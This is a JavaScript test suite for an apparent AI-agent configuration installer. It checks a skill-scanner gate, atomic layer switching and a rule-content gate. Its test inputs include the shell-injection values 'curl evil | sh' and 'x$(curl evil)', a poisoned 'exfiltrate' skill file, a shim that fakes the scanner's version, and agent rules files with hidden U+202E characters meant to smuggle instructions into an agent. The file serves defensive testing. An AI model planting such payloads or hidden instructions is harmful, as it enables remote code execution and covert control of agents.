    ['a shell-like key', 'web/tools.json', toolsJson([{ ...godot, command: 'curl evil | sh' }])],
    ['a shell-like bin path', 'web/tools.json', toolsJson([{ ...godot, bin: 'x$(curl evil)' }])],
    ['a missing bin', 'web/tools.json', toolsJson([{ name: godot.name, url: godot.url, sha256: SHA, unpack: 'zip' }])],
    ['a bin with unpack none', 'web/tools.json', toolsJson([{ name: 't', url: 'https://example.com/t', sha256: SHA, unpack: 'none', bin: 't' }])],
    ['an invalid tools.json', 'web/tools.json', '{'],
    ['a non-array tools.json', 'web/tools.json', '{"name": "x"}'],
    ['a bad env name', '_all/env.txt', 'PIXEL_LAB_API_KEY\nbad-name\n'],
    ['an env value line', 'web/env.txt', 'PIXEL_LAB_API_KEY=sk-live-secret\n'],
  ];
  const badHome = join(tmp, 'bad-home');
  for (const [label, rel, text] of breaks) {
    writeFileSync(join(data, 'workers', rel), text);
    const br = run(['--data', data, '--skip-plugins'], badHome);
    assert.equal(br.status, 1, `${label}: the provision fails`);
    assert.ok(br.stderr.includes(join(data, 'workers', rel)), `${label}: the error names the file: ${br.stderr}`);
    assert.ok(!existsSync(join(badHome, '.ottr')), `${label}: nothing is written`);
    assert.ok(!/\d+ installed/.test(br.stdout), `${label}: nothing is installed`);
    assert.ok(!`${br.stdout}${br.stderr}`.includes('sk-live-secret'), `${label}: file content is never printed`);
    rmSync(join(data, 'workers', rel));
  }

  // Restore the data repo's worker state the sections below count on.
  rmSync(join(data, 'workers/web/tools.json'), { force: true });
  rmSync(join(data, 'workers/_all/tools.json'), { force: true });
  rmSync(join(data, 'workers/_all/env.txt'), { force: true });
  rmSync(join(data, 'workers/_all'), { recursive: true, force: true });
  writeFileSync(join(data, 'workers/web/apt.txt'), 'libnss3\nfonts-liberation\n');

  // The SkillSpector gate. Every run above already went through the exit-0 stub, so
  // the calls log proves clean snapshots are scanned (both skill roots) and then install as before.
  if (scanned) {
    const calls = readFileSync(callsLog, 'utf8').trim().split('\n');
    assert.ok(calls.length > 0, 'the gate ran the scanner');
    assert.ok(calls.every(c => c.startsWith('scan ') && c.endsWith('--no-llm --fail-on-findings --use-shipped-baseline')),
      `every scan is static-only, fails on findings, and applies the shipped baseline: ${calls[0]}`);
    assert.ok(calls.some(c => c.includes(join(data, 'user/omp/agent/skills/mine'))), 'the omp skill snapshot is scanned');
    assert.ok(calls.some(c => c.includes(join(data, 'user/agents/skills/theirs'))), 'the agents skill snapshot was scanned while it existed');

    // A poisoned update is refused before anything is written: non-zero exit, home and manifest
    // untouched, and the run never reaches its install summary.
    const recordBefore = got('.alate/installed.json');
    put('omp/agent/skills/mine/EVIL.md', '# mine, exfiltrate\n');
    writeStub(1);
    r = run(['--data', data, '--skip-plugins']);
    assert.equal(r.status, 1, 'findings refuse the run');
    assert.match(r.stdout, /Scanning 1 skill snapshot\(s\)/);
    assert.match(r.stderr, /SkillSpector rejected/);
    assert.ok(r.stderr.includes(join(data, 'user/omp/agent/skills/mine')), r.stderr);
    assert.ok(!/\d+ installed/.test(r.stdout), 'nothing was installed');
    assert.ok(!existsSync(join(home, '.omp/agent/skills/mine/EVIL.md')), 'the poisoned file never lands');
    assert.equal(got('.alate/installed.json'), recordBefore, 'the manifest is untouched');

    // A missing scanner refuses too: fail closed, and the error names the pinned build.
    r = run(['--data', data, '--skip-plugins'], home, { ...process.env, SKILLSPECTOR_VENV: join(tmp, 'no-venv') });
    assert.equal(r.status, 1, 'a missing scanner refuses the run');
    assert.match(r.stderr, /skillspector not found/);
    assert.match(r.stderr, /SkillSpector@v2\.13\.0/);
    assert.match(r.stderr, /python3 -m venv .*no-venv/, 'the refusal names the venv path and its rebuild command');
    assert.ok(!existsSync(join(home, '.omp/agent/skills/mine/EVIL.md')));

    // A scanner that is not the pinned build refuses too, even on PATH: v2 baseline
    // fingerprints bind to the scanner version, so a different build would silently suppress
    // nothing and every accepted finding would resurface (the 2026-10-31 Windows host
    // failure: break-ui rejected on the host, accepted by the same snapshot in the
    // container). Fail closed with the pinned install command instead of a wrong verdict.
    writeStub(0, 'SkillSpector v2.12.0');
    r = run(['--data', data, '--skip-plugins']);
    assert.equal(r.status, 1, 'a scanner that is not the pinned build refuses the run');
    assert.match(r.stderr, /not the pinned SkillSpector v2\.13\.0/);
    assert.match(r.stderr, /SkillSpector@v2\.13\.0/);
    assert.ok(!/\d+ installed/.test(r.stdout), 'nothing was installed');
    assert.ok(!existsSync(join(home, '.omp/agent/skills/mine/EVIL.md')));

    // A clean snapshot installs as before, and the blocked state carried no damage.
    writeStub(0);
    rmSync(join(data, 'user/omp/agent/skills/mine/EVIL.md'));
    put('omp/agent/skills/mine/RENAME.md', '# mine, v6\n');
    r = run(['--data', data, '--skip-plugins']);
    assert.equal(r.status, 0, r.stderr);
    assert.match(r.stdout, /1 installed/);
    assert.equal(got('.omp/agent/skills/mine/RENAME.md'), '# mine, v6\n');

    // The pinned venv wins over PATH: it is the layout the data repo's
    // .githooks/skillspector-scan.sh bootstraps, so a host that pushes (venv present) and a
    // machine that restores (this script) scan with the same build the container image
    // carries. The PATH stub must stay unused while the venv resolves.
    const venvDir = join(tmp, 'pinned-venv');
    const venvCallsLog = join(venvDir, 'calls.log');
    mkdirSync(join(venvDir, 'bin'), { recursive: true });
    writeFileSync(join(venvDir, 'bin', 'skillspector'), `#!/bin/sh\n[ "$1" = scan ] && printf '%s\\n' "$*" >> '${venvCallsLog}'\nif [ "$1" = "--version" ]; then echo 'SkillSpector v2.13.0'; exit 0; fi\nexit 0\n`);
    chmodSync(join(venvDir, 'bin', 'skillspector'), 0o755);
    const callsBefore = readFileSync(callsLog, 'utf8');
    r = run(['--data', data, '--skip-plugins'], home, { ...process.env, PATH: `${stubDir}${delimiter}${process.env.PATH ?? ''}`, SKILLSPECTOR_VENV: venvDir });
    assert.equal(r.status, 0, r.stderr);
    assert.match(r.stdout, /4 unchanged/);
    const venvCalls = readFileSync(venvCallsLog, 'utf8').trim().split('\n');
    assert.ok(venvCalls.every(c => c.startsWith('scan ') && c.endsWith('--no-llm --fail-on-findings --use-shipped-baseline')),
      `the pinned venv ran the static-only scan: ${venvCalls[0]}`);
    assert.ok(venvCalls.some(c => c.includes(join(data, 'user/omp/agent/skills/mine'))), 'the omp skill snapshot is scanned through the venv');
    assert.equal(readFileSync(callsLog, 'utf8'), callsBefore, 'the PATH scanner stays unused when the pinned venv resolves');

    // A venv a Python upgrade broke (bin/skillspector exists but exits 1 with no output: its
    // packages sit in lib/python3.x while bin/python3 is the new interpreter, the 2026-11-01
    // ottr-alate-1 failure that stopped every provision) must not stop the run: the gate skips
    // the unusable candidate and scans with the pinned scanner on PATH.
    const brokenVenv = join(tmp, 'broken-venv');
    const brokenCallsLog = join(brokenVenv, 'calls.log');
    mkdirSync(join(brokenVenv, 'bin'), { recursive: true });
    writeFileSync(join(brokenVenv, 'bin', 'skillspector'), `#!/bin/sh\n[ "$1" = scan ] && printf '%s\\n' "$*" >> '${brokenCallsLog}'\nexit 1\n`);
    chmodSync(join(brokenVenv, 'bin', 'skillspector'), 0o755);
    writeStub(0);
    const pathCallsBefore = readFileSync(callsLog, 'utf8');
    r = run(['--data', data, '--skip-plugins'], home, { ...process.env, PATH: `${stubDir}${delimiter}${process.env.PATH ?? ''}`, SKILLSPECTOR_VENV: brokenVenv });
    assert.equal(r.status, 0, r.stderr);
    assert.match(r.stdout, /4 unchanged/);
    assert.ok(readFileSync(callsLog, 'utf8').length > pathCallsBefore.length, 'the PATH scanner scanned when the venv was broken');
    assert.ok(!existsSync(brokenCallsLog), 'the broken venv scanner stays unused');

    // But a venv scanner that runs and reports a version is held to the pin even when a pinned
    // scanner sits on PATH: a build below the pin would silently suppress nothing, so the run
    // refuses and the venv must be rebuilt, not silently swapped for a different build.
    const oldVenv = join(tmp, 'old-venv');
    mkdirSync(join(oldVenv, 'bin'), { recursive: true });
    writeFileSync(join(oldVenv, 'bin', 'skillspector'), `#!/bin/sh\nif [ "$1" = "--version" ]; then echo 'SkillSpector v2.12.0'; exit 0; fi\nexit 0\n`);
    chmodSync(join(oldVenv, 'bin', 'skillspector'), 0o755);
    r = run(['--data', data, '--skip-plugins'], home, { ...process.env, PATH: `${stubDir}${delimiter}${process.env.PATH ?? ''}`, SKILLSPECTOR_VENV: oldVenv });
    assert.equal(r.status, 1, 'a venv scanner below the pin refuses even with a pinned PATH scanner');
    assert.match(r.stderr, /not the pinned SkillSpector v2\.13\.0/);

    // The real verdict, on the real snapshot: the break-ui bytes the Windows host rejected on
    // 2026-10-31 (P1 at SKILL.md:36 resurfaced; the shipped baseline accepts them under the
    // pin) must install from a fresh home with no --force whenever a scanner carrying the pin
    // resolves — the container verdict, on any platform this suite runs on. Skips without a
    // pinned scanner, like the win32 stub skip above; the stub checks carry the offline part.
    const scannerBin = discoverRealScanner();
    if (!scannerBin) {
      console.log('real-skillspector checks skipped: no scanner reporting SkillSpector v2.13.0 (set SKILLSPECTOR_VENV to the pinned venv to run them)');
    } else {
      mkdirSync(join(data, 'user/agents/skills/break-ui'), { recursive: true });
      writeFileSync(join(data, 'user/agents/skills/break-ui/SKILL.md'), BREAK_UI_SKILL_MD);
      writeFileSync(join(data, 'user/agents/skills/break-ui/.skillspector-baseline.yaml'), BREAK_UI_BASELINE);
      const realHome = join(tmp, 'real-home');
      r = run(['--data', data, '--skip-plugins'], realHome,
        { ...process.env, SKILLSPECTOR_VENV: dirname(dirname(scannerBin)) });
      assert.equal(r.status, 0, r.stderr);
      assert.match(r.stdout, /Scanning 2 skill snapshot\(s\)/);
      assert.match(r.stdout, /at .+skillspector/, 'the run names the scanner it resolved');
      assert.equal(readFileSync(join(realHome, '.agents/skills/break-ui/SKILL.md'), 'utf8'), BREAK_UI_SKILL_MD, 'the break-ui snapshot installs byte-exact');

      // The divergence itself: a build that answers the version probe with the pin but
      // behaves like an older release (a stale, shadowed, or patched install) flips the
      // verdict to the host side — P1 resurfaces — and the run must refuse instead of
      // installing on it. The shim wraps the real venv interpreter with a shadowed
      // importlib.metadata, POSIX-only like the stubs above.
      const shimDir = join(tmp, 'shadow-venv');
      mkdirSync(join(shimDir, 'bin'), { recursive: true });
      const shadowPy = join(tmp, 'shadow.py');
      writeFileSync(shadowPy, [
        "import sys",
        "if '--version' in sys.argv[1:]:",
        "    print('SkillSpector v2.13.0')",
        "    raise SystemExit(0)",
        "import importlib.metadata as im",
        "_real = im.version",
        "im.version = lambda name, *a, **k: '2.12.0' if name == 'skillspector' else _real(name, *a, **k)",
        "from skillspector.cli import app",
        "app()",
      ].join('\n'));
      writeFileSync(join(shimDir, 'bin', 'skillspector'), `#!/bin/sh\nexec '${join(dirname(scannerBin), 'python')}' '${shadowPy}' "$@"\n`);
      chmodSync(join(shimDir, 'bin', 'skillspector'), 0o755);
      r = run(['--data', data, '--skip-plugins'], join(tmp, 'diverge-home'),
        { ...process.env, SKILLSPECTOR_VENV: shimDir });
      assert.equal(r.status, 1, 'a build that diverges from the pin refuses the run');
      assert.match(r.stderr, /SkillSpector rejected/);
      assert.match(r.stderr, /break-ui/);
      assert.ok(!existsSync(join(tmp, 'diverge-home', '.agents/skills/break-ui/SKILL.md')), 'the diverged verdict never installs');
      rmSync(join(data, 'user/agents/skills/break-ui'), { recursive: true, force: true });
    }
  } else {
    console.log('win32: the scanner-stub checks need a real skillspector on PATH; gate assertions skipped');
  }

  // Layer mode (POSIX only: the switch is a symlink rename): each provision installs into a
  // fresh .alate/layers/<commit>-<n> folder and switches .alate/current with one atomic
  // rename, so nothing a running turn reads ever changes (specs/agent-layer-switch.md). The
  // fixture data dir carries a data-root rule (installed by sync.mjs into the layer) and a
  // marketplaces.json whose catalogPath points into the home, to prove captured paths
  // re-root into the layer.
  if (process.platform === 'win32') {
    console.log('win32: the layer-switch checks need symlink privileges; skipped');
  } else {
    const ldata = join(tmp, 'data-layer');
    const putL = (rel, text) => { mkdirSync(dirname(join(ldata, 'user', rel)), { recursive: true }); writeFileSync(join(ldata, 'user', rel), text); };
    const layerHome = join(tmp, 'layer-home');
    const lconfig = 'modelRoles:\n  default: zai/glm\n';
    putL('omp/agent/config.yml', lconfig);
    putL('omp/agent/marketplaces.json', `${JSON.stringify({ marketplaces: [{ name: 'm', catalogPath: `${layerHome}/.omp/marketplaces/catalog.json` }] }, null, 2)}\n`);
    putL('omp/agent/skills/mine/SKILL.md', '# mine\n');
    mkdirSync(join(ldata, 'workers', 'web'), { recursive: true });
    writeFileSync(join(ldata, 'workers', 'web', 'apt.txt'), 'libnss3\n');
    writeFileSync(join(ldata, 'layer-rule.md'), '---\ndescription: layer test rule\n---\n\nBody\n');
    const lbase = join(layerHome, '.alate');
    const llayers = join(lbase, 'layers');
    const lcurrent = join(lbase, 'current');
    const runL = (h, extra) => run(['--data', ldata, ...extra], h);
    const lgot = (layer, rel) => readFileSync(join(layer, rel), 'utf8');
    // A pinned turn resolves current once and never follows a later switch: its whole tree
    // must stay byte-identical across any number of provisions.
    const snapshotTree = root => {
      const out = {};
      const walkTree = dir => {
        for (const e of readdirSync(dir, { withFileTypes: true })) {
          const p = join(dir, e.name);
          if (e.isSymbolicLink()) out[p] = readlinkSync(p);
          else if (e.isDirectory()) walkTree(p);
          else out[p] = readFileSync(p);
        }
      };
      walkTree(root);
      return out;
    };

    // Happy path: layer created, switched by symlink, rules and worker lists and records inside.
    let r = runL(layerHome, ['--skip-plugins', '--layer']);
    assert.equal(r.status, 0, r.stderr);
    assert.deepEqual(readdirSync(llayers).sort(), ['nogit-1'], 'the layer id is the data commit plus a counter');
    assert.ok(lstatSync(lcurrent).isSymbolicLink(), 'current is a symlink');
    const l1 = realpathSync(lcurrent);
    assert.equal(l1, join(llayers, 'nogit-1'));
    assert.equal(lgot(l1, '.omp/agent/config.yml'), lconfig);
    assert.equal(lgot(l1, '.ottr/workers/web/apt.txt'), 'libnss3\n');
    assert.equal(lgot(l1, '.omp/agent/rules/layer-rule.md'), '---\ndescription: layer test rule\n---\n\nBody\n', 'data-root rules land in the layer through sync.mjs');
    assert.ok(JSON.parse(lgot(l1, '.alate/installed.json'))['omp/agent/config.yml'], 'the install record rides in the layer');
    assert.equal(JSON.parse(lgot(l1, '.omp/agent/marketplaces.json')).marketplaces[0].catalogPath,
      join(l1, '.omp/marketplaces/catalog.json'), 'captured home paths re-root into the layer');
    assert.ok(lstatSync(join(l1, '.omp/agent/agent.db')).isSymbolicLink(), 'shared state links back to the home');
    assert.equal(readlinkSync(join(l1, '.omp/agent/agent.db')), join(layerHome, '.omp/agent/agent.db'));
    assert.ok(lstatSync(join(l1, '.omp/oauth')).isSymbolicLink());
    assert.ok(lstatSync(join(l1, '.gitconfig')).isSymbolicLink());
    assert.ok(!existsSync(join(layerHome, '.omp/agent/agent.db')), 'the shared credential store never becomes a real file');
    assert.match(r.stdout, /switched /);

    // A provision while a turn runs: the pinned layer is untouched, the new layer goes live.
    const pinned = l1;
    const pinnedTree = snapshotTree(pinned);
    r = runL(layerHome, ['--skip-plugins', '--layer']);
    assert.equal(r.status, 0, r.stderr);
    assert.deepEqual(readdirSync(llayers).sort(), ['nogit-1', 'nogit-2']);
    assert.equal(realpathSync(lcurrent), join(llayers, 'nogit-2'));
    assert.deepEqual(snapshotTree(pinned), pinnedTree, 'a pinned turn keeps its layer byte for byte');

    // Clean-up keeps the current layer and the one before it.
    r = runL(layerHome, ['--skip-plugins', '--layer']);
    assert.equal(r.status, 0, r.stderr);
    assert.deepEqual(readdirSync(llayers).sort(), ['nogit-2', 'nogit-3'], 'cleanup keeps the current layer and the one before it');

    // A layer a running turn holds (in-use.json, the runner's record) survives clean-up; an
    // unreadable record stops deletion, safety over disk space.
    writeFileSync(join(lbase, 'in-use.json'), JSON.stringify({ layers: ['nogit-2'] }));
    r = runL(layerHome, ['--skip-plugins', '--layer']);
    assert.equal(r.status, 0, r.stderr);
    assert.deepEqual(readdirSync(llayers).sort(), ['nogit-2', 'nogit-3', 'nogit-4'], 'an in-use layer survives cleanup');
    writeFileSync(join(lbase, 'in-use.json'), '{');
    r = runL(layerHome, ['--skip-plugins', '--layer']);
    assert.equal(r.status, 0, r.stderr);
    assert.match(r.stdout, /in-use\.json unreadable; keeping every layer/);
    assert.deepEqual(readdirSync(llayers).sort(), ['nogit-2', 'nogit-3', 'nogit-4', 'nogit-5']);
    writeFileSync(join(lbase, 'in-use.json'), '{"layers":[]}');
    r = runL(layerHome, ['--skip-plugins', '--layer']);
    assert.equal(r.status, 0, r.stderr);
    assert.deepEqual(readdirSync(llayers).sort(), ['nogit-5', 'nogit-6'], 'a valid empty record lets cleanup run again');

    // Machine state wins in layer mode: a machine edit beyond the deployment blocks rides
    // into the new layer (this is how the entry script's memory-backend edit survives every
    // switch), the blocks ride along either way, and block content never reaches the output.
    const blocksL = 'hindsight:\n  apiUrl: http://nas:8888\n  apiToken: $HINDSIGHT_TOKEN\n';
    const live6 = lgot(join(llayers, 'nogit-6'), '.omp/agent/config.yml');
    writeFileSync(join(llayers, 'nogit-6', '.omp/agent/config.yml'), live6.replace('zai/glm', 'zai/glm-edited') + blocksL);
    putL('omp/agent/config.yml', 'modelRoles:\n  default: zai/glm-5.3\n');
    r = runL(layerHome, ['--skip-plugins', '--layer']);
    assert.equal(r.status, 0, r.stderr);
    assert.match(r.stdout, /machine change kept: /);
    assert.equal(lgot(join(llayers, 'nogit-7'), '.omp/agent/config.yml'),
      live6.replace('zai/glm', 'zai/glm-edited') + blocksL, 'machine bytes win and the blocks ride along');
    assert.ok(!`${r.stdout}${r.stderr}`.includes('apiToken') && !`${r.stdout}${r.stderr}`.includes('nas:8888'),
      'deployment block content is never printed');
    r = runL(layerHome, ['--skip-plugins', '--layer', '--force']);
    assert.equal(r.status, 0, r.stderr);
    assert.equal(lgot(join(llayers, 'nogit-8'), '.omp/agent/config.yml'),
      'modelRoles:\n  default: zai/glm-5.3\n' + blocksL, '--force takes the snapshot, the blocks still ride along');

    // A failed scan deletes the failed layer folder and keeps the old current: a busy board
    // provisions while turns run, and a bad skill must not take the live layer down.
    const layerHome2 = join(tmp, 'layer-home-2');
    r = runL(layerHome2, ['--skip-plugins', '--layer']);
    assert.equal(r.status, 0, r.stderr);
    const base2 = join(layerHome2, '.alate');
    putL('omp/agent/skills/mine/EVIL.md', '# evil\n');
    writeStub(1);
    r = runL(layerHome2, ['--skip-plugins', '--layer']);
    assert.equal(r.status, 1, 'a failed scan refuses the run');
    assert.match(r.stderr, /SkillSpector rejected/);
    assert.equal(realpathSync(join(base2, 'current')), join(base2, 'layers', 'nogit-1'), 'a failed scan keeps the old current');
    assert.deepEqual(readdirSync(join(base2, 'layers')), ['nogit-1'], 'the failed layer folder is gone');
    assert.equal(lgot(join(base2, 'layers', 'nogit-1'), '.omp/agent/config.yml'), 'modelRoles:\n  default: zai/glm-5.3\n');
    writeStub(0);
    rmSync(join(ldata, 'user/omp/agent/skills/mine/EVIL.md'));

    // A failed rules install behaves the same: fail closed, old current stays, no layer left.
    writeFileSync(join(ldata, 'bad-rule.md'), 'no frontmatter\n');
    r = runL(layerHome2, ['--skip-plugins', '--layer']);
    assert.equal(r.status, 1, 'a failed rules install refuses the run');
    assert.match(r.stderr, /rules install failed/);
    assert.match(r.stderr, /needs frontmatter with a description/);
    assert.equal(realpathSync(join(base2, 'current')), join(base2, 'layers', 'nogit-1'));
    assert.deepEqual(readdirSync(join(base2, 'layers')), ['nogit-1']);
    rmSync(join(ldata, 'bad-rule.md'));

    // current is a real directory: refuse before any write, migration is out of scope.
    const layerHome3 = join(tmp, 'layer-home-3');
    mkdirSync(join(layerHome3, '.alate', 'current'), { recursive: true });
    r = runL(layerHome3, ['--skip-plugins', '--layer']);
    assert.equal(r.status, 1, 'a real current directory refuses the run');
    assert.match(r.stderr, /exists and is not a symlink/);
    assert.ok(!existsSync(join(layerHome3, '.alate', 'layers')), 'the refusal happens before any write');

    // The layer helpers are pure: the counter never collides with the names it read and the
    // home remap is reversible and inert without a boundary occurrence.
    const hex = rand => Array.from({ length: 12 }, () => '0123456789abcdef'[Math.floor(rand() * 16)]).join('');
    forAll((rand, size) => {
      const commit = rand() < 0.2 ? 'nogit' : hex(rand);
      const used = Array.from({ length: Math.floor(rand() * (size + 1) * 4) }, () => `${commit}-${1 + Math.floor(rand() * 50)}`);
      return { commit, used };
    }, ({ commit, used }) => {
      const n = nextLayerCounter(used, commit);
      assert.ok(Number.isInteger(n) && n >= 1, `the counter is a positive integer: ${n}`);
      assert.ok(!used.includes(`${commit}-${n}`), `the counter never collides: ${commit}-${n}`);
      const max = used.map(u => Number(u.slice(commit.length + 1))).reduce((a, b) => Math.max(a, b), 0);
      assert.ok(n > max, `the counter continues the highest: ${n} > ${max}`);
    });
    const txtChars = ['a', 'Z', '0', '-', '.', ':', ' ', '"', '\\', '/', '\n', 'x', 'y'];
    forAll((rand, size) => {
      const home = `/${Math.floor(rand() * 9)}${rand() < 0.5 ? `/${Math.floor(rand() * 9)}` : ''}`;
      const layer = `${home}/.alate/layers/l-${Math.floor(rand() * 9)}`;
      let t = '';
      for (let i = 0, n = Math.floor(rand() * (size + 1) * 12); i < n; i++) t += txtChars[Math.floor(rand() * txtChars.length)];
      if (rand() < 0.5) t += `:${home}/x`; // one boundary occurrence
      return { home, layer, t };
    }, ({ home, layer, t }) => {
      const out = remapHomePaths(t, home, layer);
      assert.equal(out.split(layer).join(home), t, 'the remap is reversible');
      if (!new RegExp(`["\\s:]${home}/`).test(t)) assert.equal(out, t, 'no boundary occurrence, no change');
    });
  }

  // Rules restored through user/ land in the live agent rules dir, so they pass the same
  // content gate sync.mjs applies to data-root rules: hidden characters that smuggle
  // instructions past human review (the U+202E bidi override below). omp loads agent-context
  // Markdown elsewhere in the snapshot as always-on instructions too (AGENTS.md, RULES.md,
  // SYSTEM.md, CLAUDE.md), so every .md/.mdc gets the hidden-character scan; only the
  // snapshot's own rules dir additionally needs the frontmatter description. The refusal
  // happens before any write, and non-Markdown content stays unscanned.
  const backdoorData = join(tmp, 'data-backdoor');
  const backdoorHome = join(tmp, 'home-backdoor');
  const putRule = (rel, text) => { mkdirSync(dirname(join(backdoorData, 'user', rel)), { recursive: true }); writeFileSync(join(backdoorData, 'user', rel), text); };
  const gotRule = rel => readFileSync(join(backdoorHome, rel), 'utf8');
  const runBackdoor = extra => run(['--data', backdoorData, ...extra], backdoorHome);
  putRule('omp/agent/rules/clean.md', '---\ndescription: clean rule\n---\n\nClean body\n');
  putRule('omp/agent/rules/backdoor.md', '---\ndescription: innocent rule\n---\n\nDirection\u202E: togglE\n');
  putRule('omp/agent/AGENTS.md', 'Context\u202Eoverride\n');
  putRule('omp/agent/RULES.md', 'Rule\u202Eoverride\n');
  putRule('notes/hidden.md', 'notes\u202Efile\n');
  r = runBackdoor(['--skip-plugins']);
  assert.equal(r.status, 1, 'a hidden character in any snapshot Markdown refuses the restore');
  assert.match(r.stderr, /Nothing installed\. Fix:/);
  assert.match(r.stderr, /user\/omp\/agent\/rules\/backdoor\.md:5:10: hidden character U\+202E/);
  assert.match(r.stderr, /user\/omp\/agent\/AGENTS\.md:1:8: hidden character U\+202E/);
  assert.match(r.stderr, /user\/omp\/agent\/RULES\.md:1:5: hidden character U\+202E/);
  assert.match(r.stderr, /user\/notes\/hidden\.md:1:6: hidden character U\+202E/);
  assert.ok(!existsSync(backdoorHome), 'the refusal happens before any write');
  rmSync(join(backdoorData, 'user/omp/agent/rules/backdoor.md'));
  rmSync(join(backdoorData, 'user/omp/agent/AGENTS.md'));
  rmSync(join(backdoorData, 'user/omp/agent/RULES.md'));
  rmSync(join(backdoorData, 'user/notes/hidden.md'));
  putRule('notes/hidden.txt', 'notes\u202Efile\n'); // not Markdown: the gate must not scan it
  r = runBackdoor(['--skip-plugins']);
  assert.equal(r.status, 0, r.stderr);
  assert.match(r.stdout, /2 installed/);
  assert.equal(gotRule('.omp/agent/rules/clean.md'), '---\ndescription: clean rule\n---\n\nClean body\n', 'a clean snapshot rule installs');
  assert.equal(gotRule('.notes/hidden.txt'), 'notes\u202Efile\n', 'a non-Markdown file with a hidden character installs unscanned');
  putRule('omp/agent/rules/clean.md', 'no frontmatter\n');
  r = runBackdoor(['--skip-plugins']);
  assert.equal(r.status, 1, 'a snapshot rule without a description refuses like a data-root rule');
  assert.match(r.stderr, /user\/omp\/agent\/rules\/clean\.md: needs frontmatter with a description/);
  assert.equal(gotRule('.omp/agent/rules/clean.md'), '---\ndescription: clean rule\n---\n\nClean body\n', 'the refusal leaves the installed rule alone');
  // The rule gate covers .mdc too (omp loads rules/*.mdc): the hidden-character refusal
  // names the snapshot path like the .md case above.
  putRule('omp/agent/rules/backdoor.mdc', '---\ndescription: mdc rule\n---\n\nFlip\u202Eit\n');
  r = runBackdoor(['--skip-plugins']);
  assert.equal(r.status, 1, 'a hidden character in a .mdc snapshot rule refuses the restore');
  assert.match(r.stderr, /user\/omp\/agent\/rules\/backdoor\.mdc:5:5: hidden character U\+202E/);
  assert.equal(gotRule('.omp/agent/rules/clean.md'), '---\ndescription: clean rule\n---\n\nClean body\n', 'the .mdc refusal leaves the installed rule alone');

  // The server image must carry the scanner the gate refuses to run without; the two pins
  // must not drift (an unpinned image made every containerized provision fail). Under the
  // mutation gate the sandbox copy of install-user.mjs is instrumented: the pin literal
  // sits inside a mutant switch on the declaration line, so take the last v-prefixed
  // literal of the line (the original value) instead of matching the whole statement.
  const source = readFileSync(fileURLToPath(new URL('./install-user.mjs', import.meta.url)), 'utf8');
  const decl = source.match(/const SKILLSPECTOR_REF[^\n]*/)?.[0] ?? '';
  const pins = decl.match(/v\d+(?:\.\d+)*/g) ?? [];
  const ref = pins[pins.length - 1];
  assert.ok(ref, 'install-user.mjs pins SKILLSPECTOR_REF');
  assert.ok(
    readFileSync(fileURLToPath(new URL('./Dockerfile', import.meta.url)), 'utf8').includes(`ARG SKILLSPECTOR_REF=${ref}`),
    `Dockerfile must carry the pinned build install-user.mjs requires (${ref})`,
  );

  console.log('install-user.mjs ok');
} finally {
  if (!keepTemp()) rmSync(tmp, { recursive: true, force: true });
}
